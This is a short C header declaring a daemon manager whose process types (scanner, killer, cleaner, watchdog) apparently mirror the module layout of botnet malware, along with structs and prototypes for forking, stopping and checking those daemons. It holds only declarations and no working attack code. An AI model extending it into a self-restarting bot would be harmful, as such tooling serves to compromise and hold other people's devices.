#pragma once

typedef void (*DAEMON_FUNCTION)(void *);

enum {
    ID_TYPE_MAIN             = 0,
    ID_TYPE_SCANNER          = 1,
    ID_TYPE_KILLER           = 2,
    ID_TYPE_CLEANER          = 3,
    ID_TYPE_WATCHDOG         = 4,
    ID_TYPE_COUNT            = 5,
    DAEMON_TYPE_FORK_RESTART = 0,
    DAEMON_TYPE_MODULE       = 1,
    DAEMON_TYPE_COUNT        = 2,
};

struct daemon_ex_list_t {
    uint8_t id_type;
    DAEMON_FUNCTION func;
};

struct daemon_t {
    pid_t *restart_pid;
    pid_t *running_pid;
    uint8_t id_type;
    uint8_t daemon_type;
};

void init_daemon_mgr();
void create_fork_daemon(uint8_t id_type, uint8_t daemon_type);
void stop_daemon(uint8_t id_type, uint8_t daemon_type);
int check_daemon(uint8_t id_type, uint8_t daemon_type);
